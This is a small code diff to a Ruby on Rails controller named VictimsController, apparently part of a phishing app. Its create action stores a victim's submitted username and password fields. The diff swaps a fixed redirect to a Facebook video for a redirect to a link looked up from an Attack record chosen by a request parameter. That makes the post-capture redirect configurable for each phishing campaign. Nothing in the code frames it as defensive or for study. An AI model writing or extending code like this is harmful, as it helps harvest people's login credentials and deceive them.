@@ -19,6 +19,7 @@ class VictimsController < ApplicationController
 
 	def create
 		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
-		redirect_to 'https://www.facebook.com/albertosardinas/videos/10153712228923011/'
+		cad =Attack.find( params[:victim][:link])
+		redirect_to "#{cad.link}"
 	end
 end
